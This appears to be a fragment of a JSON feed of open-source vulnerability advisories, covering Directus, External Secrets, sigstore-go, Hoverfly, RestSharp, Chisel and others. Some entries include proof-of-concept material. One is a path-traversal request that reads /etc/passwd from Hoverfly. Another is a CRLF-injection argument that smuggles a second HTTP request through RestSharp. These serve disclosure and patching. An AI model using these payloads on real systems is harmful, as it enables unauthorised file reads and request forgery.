            "details": "<b>Session is cached for OpenID and OAuth2 if `redirect` is not used</b><br>### Summary\nUnauthenticated user can access credentials of last authenticated user via OpenID or OAuth2 where the authentication URL did not include `redirect` query string.\n\nFor example:\n- Project is configured with OpenID or OAuth2\n- Project is configured with cache enabled\n- User tries to login via SSO link, but without `redirect` query string\n- After successful login, credentials are cached\n- If an unauthenticated user tries to login via SSO link, it will return the credentials of the other last user\n\nThe SSO link is something like `https:&#x2F;&#x2F;directus.example.com&#x2F;auth&#x2F;login&#x2F;openid&#x2F;callback`, where `openid` is the name of the OpenID provider configured in Directus\n\n### Details\nThis happens because on that endpoint for both OpenId and Oauth2 Directus is using the `respond` middleware, which by default will try to cache GET requests that met some conditions. Although, those conditions do not include this scenario, when an unauthenticated request returns user credentials.\nFor OpenID, this can be seen here:\nhttps:&#x2F;&#x2F;github.com&#x2F;directus&#x2F;directus&#x2F;blob&#x2F;main&#x2F;api&#x2F;src&#x2F;auth&#x2F;drivers&#x2F;openid.ts#L453-L459\nAnd for OAuth2 can be seen here\nhttps:&#x2F;&#x2F;github.com&#x2F;directus&#x2F;directus&#x2F;blob&#x2F;main&#x2F;api&#x2F;src&#x2F;auth&#x2F;drivers&#x2F;oauth2.ts#L422-L428\n\n### PoC\n- Create a new Directus project\n- Set `CACHE_ENABLED` to true\n- Set `CACHE_STORE` to `redis` for reliable results (if using memory with multiple nodes, it may only happen sometimes, due to cache being different for different nodes)\n- Configure `REDIS` with redis string or redis host, port, user, etc.\n- Set `AUTH_PROVIDERS` to `openid`\n- Set `PUBLIC_URL` to the the main URL of your project . \tFor example, `PUBLIC_URL: http:&#x2F;&#x2F;localhost:8055`\n- Configure `AUTH_OPENID_CLIENT_ID`, `AUTH_OPENID_CLIENT_SECRET`, `AUTH_OPENID_ISSUER_URL` with proper OpenID configurations\n- Be sure that on OpenID external app you have configured Redirect URI to `http:&#x2F;&#x2F;localhost:8055&#x2F;auth&#x2F;login&#x2F;openid&#x2F;callback`\n- Run Directus\n- Open the SSO link like `http:&#x2F;&#x2F;localhost:8055&#x2F;auth&#x2F;login&#x2F;openid&#x2F;callback`\n- Do the authentication on the OpenID external webpage\n- Verify that it you got redirected to a page with a JSON including `access_token` property\n- Be sure all anonymous mode windows are closed\n- Open an anonymous window and go to the SSO Link `http:&#x2F;&#x2F;localhost:8055&#x2F;auth&#x2F;login&#x2F;openid&#x2F;callback` and see you have the same credentials, even though you don&#x27;t have any session because you are in anonymous mode\n\n### Impact\nAll projects using OpenID or OAuth 2, that does not include `redirect` query string on loggin in users.\n",

            "details": "<b>External Secrets Operator vulnerable to privilege escalation</b><br>### Details\nThe external-secrets has a deployment called default-external-secrets-cert-controller, which is bound with a same-name ClusterRole. This ClusterRole has &quot;get&#x2F;list&quot; verbs of secrets resources(https:&#x2F;&#x2F;github.com&#x2F;external-secrets&#x2F;external-secrets&#x2F;blob&#x2F;main&#x2F;deploy&#x2F;charts&#x2F;external-secrets&#x2F;templates&#x2F;cert-controller-rbac.yaml#L49). It also has path&#x2F;update verb of validatingwebhookconfigurations resources(https:&#x2F;&#x2F;github.com&#x2F;external-secrets&#x2F;external-secrets&#x2F;blob&#x2F;main&#x2F;deploy&#x2F;charts&#x2F;external-secrets&#x2F;templates&#x2F;cert-controller-rbac.yaml#L27). As a result, if a malicious user can access the worker node which has this deployment. he&#x2F;she can:\n1. For the &quot;get&#x2F;list secrets&quot; permission, he&#x2F;she can abuse the SA token of this deployment to retrieve or get ALL secrets in the whole cluster, including the cluster-admin secret if created. After that, he&#x2F;she can abuse the cluster-admin secret to do whatever he&#x2F;she likes to the whole cluster, resulting in a cluster-level privilege escalation.\n\n2. For the patch&#x2F;update verb of validatingwebhookconfigurations, the malicious user can abuse these permissions to get sensitive data or lanuch DoS attacks:\n\nFor the privilege escalation attack, by updating&#x2F;patching a Webhook to make it listen to Secret update operations, the attacker can capture and log all data from requests attempting to update Secrets. More specifically, when a Secret is updated, this Webhook sends the request data to the logging-service, which can then log the content of the Secret. This way, an attacker could indirectly gain access to the full contents of the Secret.\n\nFor the DoS attack, by updating&#x2F;patching a Webhook, and making it deny all Pod create and update requests, the attacker can prevent any new Pods from being created or existing Pods from being updated, resulting in a Denial of Service (DoS) attack.\n\n### PoC\nPlease see the &quot;Details&quot; section\n\n### Impact\nPrivilege escalation",

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-45405' target='_blank'>CVE-2024-45405</a>",
            "details": "<b></b><br>`gix-path` is a crate of the `gitoxide` project (an implementation of `git` written in Rust) dealing paths and their conversions. Prior to version 0.10.11, `gix-path` runs `git` to find the path of a configuration file associated with the `git` installation, but improperly resolves paths containing unusual or non-ASCII characters, in rare cases enabling a local attacker to inject configuration leading to code execution. Version 0.10.11 contains a patch for the issue.\n\nIn `gix_path::env`, the underlying implementation of the `installation_config` and `installation_config_prefix` functions calls `git config -l --show-origin` to find the path of a file to treat as belonging to the `git` installation. Affected versions of `gix-path` do not pass `-z`&#x2F;`--null` to cause `git` to report literal paths. Instead, to cover the occasional case that `git` outputs a quoted path, they attempt to parse the path by stripping the quotation marks. The problem is that, when a path is quoted, it may change in substantial ways beyond the concatenation of quotation marks. If not reversed, these changes can result in another valid path that is not equivalent to the original.\n\nOn a single-user system, it is not possible to exploit this, unless `GIT_CONFIG_SYSTEM` and `GIT_CONFIG_GLOBAL` have been set to unusual values or Git has been installed in an unusual way. Such a scenario is not expected. Exploitation is unlikely even on a multi-user system, though it is plausible in some uncommon configurations or use cases. In general, exploitation is more likely to succeed if users are expected to install `git` themselves, and are likely to do so in predictable locations; locations where `git` is installed, whether due to usernames in their paths or otherwise, contain characters that `git` quotes by default in paths, such as non-English letters and accented letters; a custom `system`-scope configuration file is specified with the `GIT_CONFIG_SYSTEM` environment variable, and its path is in an unusual location or has strangely named components; or a `system`-scope configuration file is absent, empty, or suppressed by means other than `GIT_CONFIG_NOSYSTEM`. Currently, `gix-path` can treat a `global`-scope configuration file as belonging to the installation if no higher scope configuration file is available. This increases the likelihood of exploitation even on a system where `git` is installed system-wide in an ordinary way. However, exploitation is expected to be very difficult even under any combination of those factors.",

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-45395' target='_blank'>CVE-2024-45395</a>",
            "details": "<b></b><br>sigstore-go, a Go library for Sigstore signing and verification, is susceptible to a denial of service attack in versions prior to 0.6.1 when a verifier is provided a maliciously crafted Sigstore Bundle containing large amounts of verifiable data, in the form of signed transparency log entries, RFC 3161 timestamps, and attestation subjects. The verification of these data structures is computationally expensive. This can be used to consume excessive CPU resources, leading to a denial of service attack. TUF&#x27;s security model labels this type of vulnerability an &quot;Endless data attack,&quot; and can lead to verification failing to complete and disrupting services that rely on sigstore-go for verification. This vulnerability is addressed with sigstore-go 0.6.1, which adds hard limits to the number of verifiable data structures that can be processed in a bundle. Verification will fail if a bundle has data that exceeds these limits. The limits are 32 signed transparency log entries, 32 RFC 3161 timestamps, 1024 attestation subjects, and 32 digests per attestation subject. These limits are intended to be high enough to accommodate the vast majority of use cases, while preventing the verification of maliciously crafted bundles that contain large amounts of verifiable data. Users who are vulnerable but unable to quickly upgrade may consider adding manual bundle validation to enforce limits similar to those in the referenced patch prior to calling sigstore-go&#x27;s verification functions.",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-cq38-jh5f-37mq' target='_blank'>GHSA-cq38-jh5f-37mq</a>",
            "details": "<b>sigstore-go has an unbounded loop over untrusted input can lead to endless data attack</b><br>### Impact\n\nsigstore-go is susceptible to a denial of service attack when a verifier is provided a maliciously crafted Sigstore Bundle containing large amounts of verifiable data, in the form of signed transparency log entries, RFC 3161 timestamps, and attestation subjects. The verification of these data structures is computationally expensive. This can be used to consume excessive CPU resources, leading to a denial of service attack. TUF&#x27;s security model labels this type of vulnerability an &quot;Endless data attack,&quot; and can lead to verification failing to complete and disrupting services that rely on sigstore-go for verification.\n\nThe vulnerable loops are in the verification functions in the package `github.com&#x2F;sigstore&#x2F;sigstore-go&#x2F;pkg&#x2F;verify`. The first is the DSSE envelope verification loop in `verifyEnvelopeWithArtifact`, which decodes all the digests in an attestation can be found here:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;sigstore&#x2F;sigstore-go&#x2F;blob&#x2F;725e508ed4933e6f5b5206e32af4bbe76f587b54&#x2F;pkg&#x2F;verify&#x2F;signature.go#L183-L193\n\nThe next loop is in the `VerifyArtifactTransparencyLog` function, which verifies all the signed entries in a bundle:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;sigstore&#x2F;sigstore-go&#x2F;blob&#x2F;725e508ed4933e6f5b5206e32af4bbe76f587b54&#x2F;pkg&#x2F;verify&#x2F;tlog.go#L74-L178\n\nThe next loop is the `VerifyTimestampAuthority` function, which verifies all the RFC 3161 timestamps in a bundle:\n\nhttps:&#x2F;&#x2F;github.com&#x2F;sigstore&#x2F;sigstore-go&#x2F;blob&#x2F;725e508ed4933e6f5b5206e32af4bbe76f587b54&#x2F;pkg&#x2F;verify&#x2F;tsa.go#L59-L68\n\n### Patches\n\nThis vulnerability is addressed with sigstore-go 0.6.1, which adds hard limits to the number of verifiable data structures that can be processed in a bundle. Verification will fail if a bundle has data that exceeds these limits. The limits are:\n\n- 32 signed transparency log entries\n- 32 RFC 3161 timestamps\n- 1024 attestation subjects\n- 32 digests per attestation subject\n\nThese limits are intended to be high enough to accommodate the vast majority of use cases, while preventing the verification of maliciously crafted bundles that contain large amounts of verifiable data.\n\n### Workarounds\n\nThe best way to mitigate the risk is to upgrade to sigstore-go 0.6.1 or later. Users who are vulnerable but unable to quickly upgrade may consider adding manual bundle validation to enforce limits similar to those in the referenced patch prior to calling sigstore-go&#x27;s verification functions.\n",

            "id": "<a href='https://osv.dev/vulnerability/GHSA-6xx4-x46f-f897' target='_blank'>GHSA-6xx4-x46f-f897</a>",
            "details": "<b>Hoverfly allows an arbitrary file read in the `&#x2F;api&#x2F;v2&#x2F;simulation` endpoint (`GHSL-2023-274`)</b><br>### Details\n\nThe `&#x2F;api&#x2F;v2&#x2F;simulation` [POST handler](https:&#x2F;&#x2F;github.com&#x2F;spectolabs&#x2F;hoverfly&#x2F;blob&#x2F;15d6ee9ea4e0de67aec5a41c28d21dc147243da0&#x2F;core&#x2F;handlers&#x2F;v2&#x2F;simulation_handler.go#L87) allows users to create new simulation views from the contents of a user-specified file. This feature can be abused by an attacker to read arbitrary files from the Hoverfly server.\n\n```go\n# https:&#x2F;&#x2F;github.com&#x2F;spectolabs&#x2F;hoverfly&#x2F;blob&#x2F;15d6ee9ea4e0de67aec5a41c28d21dc147243da0&#x2F;core&#x2F;hoverfly_funcs.go#L186\nfunc (hf *Hoverfly) readResponseBodyFile(filePath string) (string, error) {\n\tif filepath.IsAbs(filePath) {\n\t\treturn &quot;&quot;, fmt.Errorf(&quot;bodyFile contains absolute path (%s). only relative is supported&quot;, filePath)\n\t}\n\n\tfileContents, err := ioutil.ReadFile(filepath.Join(hf.Cfg.ResponsesBodyFilesPath, filePath))\n\tif err != nil {\n\t\treturn &quot;&quot;, err\n\t}\n\n\treturn string(fileContents[:]), nil\n}\n```\n\nNote that, although the code prevents absolute paths from being specified, an attacker can escape out of the `hf.Cfg.ResponsesBodyFilesPath` base path by using `..&#x2F;` segments and reach any arbitrary files.\n\nThis issue was found using the [Uncontrolled data used in path expression CodeQL query for python](https:&#x2F;&#x2F;codeql.github.com&#x2F;codeql-query-help&#x2F;go&#x2F;go-path-injection&#x2F;).\n#### Proof of Concept\n\nSend the following `POST` request to read the `&#x2F;etc&#x2F;passwd` file:\n\n```http\nPOST &#x2F;api&#x2F;v2&#x2F;simulation HTTP&#x2F;1.1\nHost: localhost:8888\nConnection: close\nContent-Type: application&#x2F;x-www-form-urlencoded\nContent-Length: 128\n\n{&quot;data&quot;:{&quot;pairs&quot;:[{\n&quot;request&quot;:{},&quot;response&quot;: {\n&quot;bodyFile&quot;: &quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;}} ]},&quot;meta&quot;:{&quot;schemaVersion&quot;:&quot;v5.2&quot;}}\n\n```\n\nResponse will contain the Hoverfly&#x27;s server `&#x2F;etc&#x2F;passwd`\n```\nHTTP&#x2F;1.1 200 OK\nContent-Type: application&#x2F;json; charset=utf-8\nDate: Tue, 19 Dec 2023 20:59:16 GMT\nContent-Length: 1494\nConnection: close\n\n{&quot;data&quot;:{&quot;pairs&quot;:[{&quot;request&quot;:{},&quot;response&quot;:{&quot;status&quot;:0,&quot;body&quot;:&quot;root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash\\nbin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin\\ndaemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin\\nadm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin\\nlp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin\\nsync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync\\nshutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown\\nhalt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt\\nmail:x:8:12:mail:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin\\nnews:x:9:13:news:&#x2F;usr&#x2F;lib&#x2F;news:&#x2F;sbin&#x2F;nologin\\nuucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucppublic:&#x2F;sbin&#x2F;nologin\\noperator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin\\nman:x:13:15:man:&#x2F;usr&#x2F;man:&#x2F;sbin&#x2F;nologin\\npostmaster:x:14:12:postmaster:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin\\ncron:x:16:16:cron:&#x2F;var&#x2F;spool&#x2F;cron:&#x2F;sbin&#x2F;nologin\\nftp:x:21:21::&#x2F;var&#x2F;lib&#x2F;ftp:&#x2F;sbin&#x2F;nologin\\nsshd:x:22:22:sshd:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin\\nat:x:25:25:at:&#x2F;var&#x2F;spool&#x2F;cron&#x2F;atjobs:&#x2F;sbin&#x2F;nologin\\nsquid:x:31:31:Squid:&#x2F;var&#x2F;cache&#x2F;squid:&#x2F;sbin&#x2F;nologin\\nxfs:x:33:33:X Font Server:&#x2F;etc&#x2F;X11&#x2F;fs:&#x2F;sbin&#x2F;nologin\\ngames:x:35:35:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin\\ncyrus:x:85:12::&#x2F;usr&#x2F;cyrus:&#x2F;sbin&#x2F;nologin\\nvpopmail:x:89:89::&#x2F;var&#x2F;vpopmail:&#x2F;sbin&#x2F;nologin\\nntp:x:123:123:NTP:&#x2F;var&#x2F;empty:&#x2F;sbin&#x2F;nologin\\nsmmsp:x:209:209:smmsp:&#x2F;var&#x2F;spool&#x2F;mqueue:&#x2F;sbin&#x2F;nologin\\nguest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin\\nnobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin\\n&quot;,&quot;bodyFile&quot;:&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;,&quot;encodedBody&quot;:false,&quot;templated&quot;:false}}],&quot;globalActions&quot;:{&quot;delays&quot;:[],&quot;delaysLogNormal&quot;:[]}},&quot;meta&quot;:{&quot;schemaVersion&quot;:&quot;v5.2&quot;,&quot;hoverflyVersion&quot;:&quot;v1.6.1&quot;,&quot;timeExported&quot;:&quot;2023-12-19T20:59:16Z&quot;}}\n\n```\n\n#### Impact\n\nThis issue may lead to Information Disclosure.\n#### Remediation\n\nThe code is [preventing absolute paths from being read](https:&#x2F;&#x2F;github.com&#x2F;spectolabs&#x2F;hoverfly&#x2F;blob&#x2F;15d6ee9ea4e0de67aec5a41c28d21dc147243da0&#x2F;core&#x2F;hoverfly_funcs.go#L186). Make sure the final path (`filepath.Join(hf.Cfg.ResponsesBodyFilesPath, filePath)`) is contained within the expected base path (`filepath.Join(hf.Cfg.ResponsesBodyFilesPath, &quot;&#x2F;&quot;)`)",

            "details": "<b>@actions&#x2F;artifact has an Arbitrary File Write via artifact extraction</b><br>### Impact\n\nVersions of `actions&#x2F;artifact` before 2.1.7 are vulnerable to arbitrary file write when using `downloadArtifactInternal`, `downloadArtifactPublic`, or `streamExtractExternal` for extracting a specifically crafted artifact that contains path traversal filenames.\n\n### Patches\n\nUpgrade to version 2.1.7 or higher. \n\n### References\n\n- https:&#x2F;&#x2F;snyk.io&#x2F;research&#x2F;zip-slip-vulnerability\n- https:&#x2F;&#x2F;github.com&#x2F;actions&#x2F;toolkit&#x2F;pull&#x2F;1724\n\n### CVE\n\nCVE-2024-42471\n\n### Credits\n\nJustin Taft from Google",

            "details": "<b></b><br>Quinn is a pure-Rust, async-compatible implementation of the IETF QUIC transport protocol. As of quinn-proto 0.11, it is possible for a server to `accept()`, `retry()`, `refuse()`, or `ignore()` an `Incoming` connection. However, calling `retry()` on an unvalidated connection exposes the server to a likely panic in the following situations:  1. Calling `refuse` or `ignore` on the resulting validated connection, if a duplicate initial packet is received. This issue can go undetected until a server&#x27;s `refuse()`&#x2F;`ignore()` code path is exercised, such as to stop a denial of service attack. 2. Accepting when the initial packet for the resulting validated connection fails to decrypt or exhausts connection IDs, if a similar initial packet that successfully decrypts and doesn&#x27;t exhaust connection IDs is received. This issue can go undetected if clients are well-behaved. The former situation was observed in a real application, while the latter is only theoretical.",
            "published": "2024-09-02T18:15:37Z",
            "severity": "0",
            "langs": "rs",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/quinn-rs/quinn/blob/bb02a12a8435a7732a1d762783eeacbb7e50418e/quinn-proto/src/endpoint.rs#L213'>https://github.com/quinn-rs/quinn/blob/bb02a12a8435a7732a1d762783eeacbb7e50418e/quinn-proto/src/endpoint.rs#L213</a></li></ul>"

            "details": "<b>nanopb vulnerable to invalid free() call with oneofs and PB_ENABLE_MALLOC</b><br>### Impact\nDecoding a specifically formed message can cause invalid `free()` or `realloc()` calls if the message type contains an `oneof` field, and the `oneof` directly contains both a pointer field and a non-pointer field. If the message data first contains the non-pointer field and then the pointer field, the data of the non-pointer field is incorrectly treated as if it was a pointer value. Such message data rarely occurs in normal messages, but it is a concern when untrusted data is parsed.\n\n### Patches\nPreliminary patch is available on git for [0.4.x](https:&#x2F;&#x2F;github.com&#x2F;nanopb&#x2F;nanopb&#x2F;commit&#x2F;e2f0ccf939d9f82931d085acb6df8e9a182a4261) and [0.3.x](https:&#x2F;&#x2F;github.com&#x2F;nanopb&#x2F;nanopb&#x2F;commit&#x2F;4a375a560651a86726e5283be85a9231fd0efe9c) branches. The fix will be released in versions 0.3.9.8 and 0.4.5 once testing has been completed.\n\n### Workarounds\nFollowing workarounds are available:\n* Set the option `no_unions` for the oneof field. This will generate fields as separate instead of C union, and avoids triggering the problematic code.\n* Set the type of all fields inside the oneof to `FT_POINTER`. This ensures that the data contained inside the `union` is always a valid pointer.\n* Heap implementations that guard against invalid `free()` provide a partial mitigation. Depending on the message type, the pointer value may be attacker controlled and can be used to bypass heap protections.\n\n### References\nBug report: https:&#x2F;&#x2F;github.com&#x2F;nanopb&#x2F;nanopb&#x2F;issues&#x2F;647\n\n### For more information\nIf you have any questions or comments about this advisory, comment on the bug report linked above.",

            "id": "<a href='https://osv.dev/vulnerability/CVE-2024-45302' target='_blank'>CVE-2024-45302</a>",
            "details": "<b></b><br>RestSharp is a Simple REST and HTTP API Client for .NET. The second argument to `RestRequest.AddHeader` (the header value) is vulnerable to CRLF injection. The same applies to `RestRequest.AddOrUpdateHeader` and `RestClient.AddDefaultHeader`. The way HTTP headers are added to a request is via the `HttpHeaders.TryAddWithoutValidation` method which does not check for CRLF characters in the header value. This means that any headers from a `RestSharp.RequestHeaders` object are added to the request in such a way that they are vulnerable to CRLF-injection. In general, CRLF-injection into a HTTP header (when using HTTP&#x2F;1.1) means that one can inject additional HTTP headers or smuggle whole HTTP requests. If an application using the RestSharp library passes a user-controllable value through to a header, then that application becomes vulnerable to CRLF-injection. This is not necessarily a security issue for a command line application like the one above, but if such code were present in a web application then it becomes vulnerable to request splitting (as shown in the PoC) and thus Server Side Request Forgery. Strictly speaking this is a potential vulnerability in applications using RestSharp, not in RestSharp itself, but I would argue that at the very least there needs to be a warning about this behaviour in the RestSharp documentation. RestSharp has addressed this issue in version 112.0.0. All users are advised to upgrade. There are no known workarounds for this vulnerability.",
            "published": "2024-08-29T22:15:05Z",
            "severity": "0",
            "langs": "cs",
            "references": "<ul><li>- <a target='_blank' href='https://github.com/restsharp/RestSharp/blob/777bf194ec2d14271e7807cc704e73ec18fcaf7e/src/RestSharp/Request/HttpRequestMessageExtensions.cs#L32'>https://github.com/restsharp/RestSharp/blob/777bf194ec2d14271e7807cc704e73ec18fcaf7e/src/RestSharp/Request/HttpRequestMessageExtensions.cs#L32</a></li></ul>"
        }, {
            "ecosystem": "NuGet",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-4rr6-2v9v-wcpc' target='_blank'>GHSA-4rr6-2v9v-wcpc</a>",
            "details": "<b>CRLF Injection in RestSharp&#x27;s `RestRequest.AddHeader` method</b><br>### Summary\nThe second argument to `RestRequest.AddHeader` (the header value) is vulnerable to CRLF injection. The same applies to `RestRequest.AddOrUpdateHeader` and `RestClient.AddDefaultHeader`.\n\n### Details\nThe way HTTP headers are added to a request is via the `HttpHeaders.TryAddWithoutValidation` method: &amp;lt;https:&#x2F;&#x2F;github.com&#x2F;restsharp&#x2F;RestSharp&#x2F;blob&#x2F;777bf194ec2d14271e7807cc704e73ec18fcaf7e&#x2F;src&#x2F;RestSharp&#x2F;Request&#x2F;HttpRequestMessageExtensions.cs#L32&amp;gt; This method does not check for CRLF characters in the header value.\n\nThis means that any headers from a `RestSharp.RequestHeaders` object are added to the request in such a way that they are vulnerable to CRLF-injection. In general, CRLF-injection into a HTTP header (when using HTTP&#x2F;1.1) means that one can inject additional HTTP headers or smuggle whole HTTP requests.\n\n### PoC\nThe below example code creates a console app that takes one command line variable &quot;api key&quot; and then makes a request to some status page with the provided key inserted in the &quot;Authorization&quot; header:\n\n```c#\nusing RestSharp;\n\nclass Program\n{\n    static async Task Main(string[] args)\n    {\n        &#x2F;&#x2F; Usage: dotnet run &amp;lt;api key&amp;gt;\n        var key = args[0];\n        var options = new RestClientOptions(&quot;http:&#x2F;&#x2F;insert.some.site.here&quot;);\n        var client = new RestClient(options);\n        var request = new RestRequest(&quot;&#x2F;status&quot;, Method.Get).AddHeader(&quot;Authorization&quot;, key);\n        var response = await client.ExecuteAsync(request);\n        Console.WriteLine($&quot;Status: {response.StatusCode}&quot;);\n        Console.WriteLine($&quot;Response: {response.Content}&quot;);\n    }\n}\n```\n\nThis application is now vulnerable to CRLF-injection, and can thus be abused to for example perform request splitting and thus server side request forgery (SSRF):\n\n```bash\nanonymous@ubuntu-sofia-672448:~$ dotnet RestSharp-cli.dll $&#x27;test\\r\\nUser-Agent: injected header!\\r\\n\\r\\nGET &#x2F;smuggled HTTP&#x2F;1.1\\r\\nHost: insert.some.site.here&#x27;\nStatus: OK\nResponse: &amp;lt;html&amp;gt;&amp;lt;&#x2F;html&amp;gt;\n```\n\nThe application intends to send a single request of the form:\n```http\nGET &#x2F;status HTTP&#x2F;1.1\nHost: insert.some.site.here\nAuthorization: &amp;lt;api key&amp;gt;\nUser-Agent: RestSharp&#x2F;111.4.1.0\nAccept: application&#x2F;json, text&#x2F;json, text&#x2F;x-json, text&#x2F;javascript, application&#x2F;xml, text&#x2F;xml\nAccept-Encoding: gzip, deflate, br\n```\nBut as the application is vulnerable to CRLF injection the above command will instead result in the following two requests being sent:\n```http\nGET &#x2F;status HTTP&#x2F;1.1\nHost: insert.some.site.here\nAuthorization: test\nUser-Agent: injected header!\n```\nand\n```http\nGET &#x2F;smuggled HTTP&#x2F;1.1\nHost: insert.some.site.here\nUser-Agent: RestSharp&#x2F;111.4.1.0\nAccept: application&#x2F;json, text&#x2F;json, text&#x2F;x-json, text&#x2F;javascript, application&#x2F;xml, text&#x2F;xml\nAccept-Encoding: gzip, deflate, br\n```\n\nThis can be confirmed by checking the access logs on the server where these commands were run (with `insert.some.site.here` pointing to localhost):\n```bash\nanonymous@ubuntu-sofia-672448:~$ sudo tail &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log\n127.0.0.1 - - [29&#x2F;Aug&#x2F;2024:11:41:11 +0000] &quot;GET &#x2F;status HTTP&#x2F;1.1&quot; 200 240 &quot;-&quot; &quot;injected header!&quot;\n127.0.0.1 - - [29&#x2F;Aug&#x2F;2024:11:41:11 +0000] &quot;GET &#x2F;smuggled HTTP&#x2F;1.1&quot; 404 436 &quot;-&quot; &quot;RestSharp&#x2F;111.4.1.0&quot;\n```\n\n### Impact\nIf an application using the RestSharp library passes a user-controllable value through to a header, then that application becomes vulnerable to CRLF-injection. This is not necessarily a security issue for a command line application like the one above, but if such code were present in a web application then it becomes vulnerable to request splitting (as shown in the PoC) and thus Server Side Request Forgery.\n\nStrictly speaking this is a potential vulnerability in applications using RestSharp, not in RestSharp itself, but I would argue that at the very least there needs to be a warning about this behaviour in the RestSharp documentation.\n\n",

            "details": "<b>Taipy has a Session Cookie without Secure and HTTPOnly flags</b><br>### Summary\nSession cookie is without Secure and HTTPOnly flags.\n\n### Details\nPlease take a look at this part of code (PoC screenshot) or check code directly (provided in Occurrences section below)\n\n**Occurrences**:\nhttps:&#x2F;&#x2F;github.com&#x2F;Avaiga&#x2F;taipy&#x2F;blob&#x2F;develop&#x2F;frontend&#x2F;taipy-gui&#x2F;src&#x2F;components&#x2F;Taipy&#x2F;Navigate.tsx#L67\n\n**Proposed remediation:** add Secure and HTTPOnly flags for cookies.\n\nIt could be like this:\ndocument.cookie = `tprh=${tprh};path=&#x2F;;Secure;HttpOnly;`;\n\n\n### PoC\n**Screenshot**:\n![image](https:&#x2F;&#x2F;github.com&#x2F;Avaiga&#x2F;taipy&#x2F;assets&#x2F;18367606&#x2F;ea7d1bbd-ba27-447f-932b-3d33ffc1a2e7)\n\n\n### Impact\n**Secure**: This flag indicates that the cookie should only be sent over secure HTTPS connections. Without this flag, the cookie will be sent over both HTTP and HTTPS connections, which could expose it to interception or tampering if the connection is not secure.\n**HttpOnly:** This flag prevents the cookie from being accessed by client-side JavaScript. It helps mitigate certain types of attacks, such as cross-site scripting (XSS), by preventing malicious scripts from accessing the cookie&#x27;s value.\n\n**References**\n    CWE-614: Sensitive Cookie in HTTPS Session Without &#x27;Secure&#x27; Attribute https:&#x2F;&#x2F;cwe.mitre.org&#x2F;data&#x2F;definitions&#x2F;614.html\n    CWE-1004: Sensitive Cookie Without &#x27;HttpOnly&#x27; Flag - https:&#x2F;&#x2F;cwe.mitre.org&#x2F;data&#x2F;definitions&#x2F;1004.html\n    OWASP - Secure Cookie Attribute - https:&#x2F;&#x2F;owasp.org&#x2F;www-community&#x2F;controls&#x2F;SecureCookieAttribute\n    Cookie security flags - https:&#x2F;&#x2F;www.invicti.com&#x2F;learn&#x2F;cookie-security-flags&#x2F;\n    Cookie lack Secure flag - https:&#x2F;&#x2F;support.detectify.com&#x2F;support&#x2F;solutions&#x2F;articles&#x2F;48001048982-cookie-lack-secure-flag\n\n**Other**:\nTitle: Encrypting the Web\nURL: https:&#x2F;&#x2F;www.eff.org&#x2F;encrypt-the-web\n\nUpdate (Required advisory information) - added severity, resource: \nhttps:&#x2F;&#x2F;portswigger.net&#x2F;kb&#x2F;issues&#x2F;00500200_tls-cookie-without-secure-flag-set\n\nBest regards,",

            "ecosystem": "Go",
            "id": "<a href='https://osv.dev/vulnerability/GHSA-38jh-8h67-m7mj' target='_blank'>GHSA-38jh-8h67-m7mj</a>",
            "details": "<b>Chisel&#x27;s AUTH environment variable not respected in server entrypoint</b><br>### Summary\nThe Chisel server doesn&#x27;t ever read the documented `AUTH` environment variable used to set credentials, which allows any unauthenticated user to connect, even if credentials were set. This advisory is a formalization of a report sent to the maintainer via email.\n\n### Details\nIn the help page for the `chisel server` subcommand, it mentions an `AUTH` environment variable that can be set in order to provide credentials that the server should authenticate connections against: https:&#x2F;&#x2F;github.com&#x2F;jpillora&#x2F;chisel&#x2F;blob&#x2F;3de177432cd23db58e57f376b62ad497cc10840f&#x2F;main.go#L138.\n\nThe issue is that the server entrypoint doesn&#x27;t ever read the `AUTH` environment variable. The only place that this happens is in the client entrypoint: https:&#x2F;&#x2F;github.com&#x2F;jpillora&#x2F;chisel&#x2F;blob&#x2F;3de177432cd23db58e57f376b62ad497cc10840f&#x2F;main.go#L452\n\nThis subverts the expectations set by the documentation, allowing unauthenticated users to connect to a Chisel server, even if auth is attempted to be set up in this manner.\n\n### PoC\nRun `chisel server`, first specifying credentials with the `AUTH` environment variable, then with the `--auth` argument. In the first case, the server allows connections without authentication, while in the second, the correct behavior is exhibited.\n\n### Impact\nAnyone who is running the Chisel server, and that is using the `AUTH` environment variable to specify credentials to authenticate against. Chisel is often used to provide an entrypoint to a private network, which means services that are gated by Chisel may be affected. Additionally, Chisel is often used for exposing services to the internet. An attacker could MITM requests by connecting to a Chisel server and requesting to forward traffic from a remote port. ",
            "published": "2024-08-27T18:40:29Z",
            "severity": "8.6",
            "langs": "go",
